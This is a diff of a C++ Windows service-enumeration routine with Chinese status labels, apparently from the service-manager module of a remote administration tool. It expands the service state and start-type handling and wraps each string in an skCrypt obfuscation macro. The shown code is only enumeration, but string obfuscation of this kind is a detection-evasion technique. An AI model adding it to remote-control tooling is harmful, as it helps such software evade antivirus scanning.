@@ -30,6 +30,10 @@ VOID CServicesManager::SendServicesList()
 	LocalFree(szBuffer);
 }
 
+#ifndef skCrypt
+#define skCrypt(p) p
+#endif
+
 LPBYTE CServicesManager::GetServicesList()
 {
 	LPENUM_SERVICE_STATUS  ServicesStatus    = NULL; 
@@ -88,31 +92,68 @@ LPBYTE CServicesManager::GetServicesList()
 		QueryServiceConfig(hServices,ServicesInfor,4*1024,&dwResumeHandle); 
 		//查询服务的启动类别
 
-		if (ServicesStatus[i].ServiceStatus.dwCurrentState!=SERVICE_STOPPED) //启动状态
-		{
-			ZeroMemory(szRunWay, sizeof(szRunWay));
-			lstrcat(szRunWay,"启动");
+		ZeroMemory(szRunWay, sizeof(szRunWay));
+		switch (ServicesStatus[i].ServiceStatus.dwCurrentState) {
+		case SERVICE_STOPPED: {
+			lstrcatA(szRunWay, skCrypt("停止"));
+			break;
 		}
-		else
-		{
-			ZeroMemory(szRunWay, sizeof(szRunWay));
-			lstrcat(szRunWay,"停止");
+		case SERVICE_START_PENDING: {
+			lstrcatA(szRunWay, skCrypt("启动中"));
+			break;
+		}
+		case SERVICE_STOP_PENDING: {
+			lstrcatA(szRunWay, skCrypt("停止中"));
+			break;
+		}
+		case SERVICE_RUNNING: {
+			lstrcatA(szRunWay, skCrypt("启动"));
+			break;
+		}
+		case SERVICE_CONTINUE_PENDING: {
+			lstrcatA(szRunWay, skCrypt("继续"));
+			break;
+		}
+		case SERVICE_PAUSE_PENDING: {
+			lstrcatA(szRunWay, skCrypt("暂停中"));
+			break;
+		}
+		case SERVICE_PAUSED: {
+			lstrcatA(szRunWay, skCrypt("暂停"));
+			break;
+		}
+		default: {
+			lstrcatA(szRunWay, skCrypt("未知"));
+			break;
+		}
 		}
 
-		if(2==ServicesInfor->dwStartType) //启动类别  //SERVICE_AUTO_START
-		{
-			ZeroMemory(szAutoRun, sizeof(szAutoRun));
-			lstrcat(szAutoRun,"自动");
+		ZeroMemory(szAutoRun, sizeof(szAutoRun));
+		switch (ServicesInfor->dwStartType) {
+		case SERVICE_BOOT_START: {
+			lstrcatA(szAutoRun, skCrypt("内核"));
+			break;
 		}
-		if(3==ServicesInfor->dwStartType)   //SERVICE_DEMAND_START
-		{
-			ZeroMemory(szAutoRun, sizeof(szAutoRun));
-			lstrcat(szAutoRun,"手动");
+		case SERVICE_SYSTEM_START: {
+			lstrcatA(szAutoRun, skCrypt("系统"));
+			break;
 		}
-		if(4==ServicesInfor->dwStartType)
-		{
-			ZeroMemory(szAutoRun, sizeof(szAutoRun));   //SERVICE_DISABLED
-			lstrcat(szAutoRun,"禁用");
+		case SERVICE_AUTO_START: {
+			lstrcatA(szAutoRun, skCrypt("自动"));
+			break;
+		}
+		case SERVICE_DEMAND_START: {
+			lstrcatA(szAutoRun, skCrypt("手动"));
+			break;
+		}
+		case SERVICE_DISABLED: {
+			lstrcatA(szAutoRun, skCrypt("禁用"));
+			break;
+		}
+		default: {
+			lstrcatA(szAutoRun, skCrypt("未知"));
+			break;
+		}
 		}
 
 		dwLength = sizeof(DWORD) + lstrlen(ServicesStatus[i].lpDisplayName) 
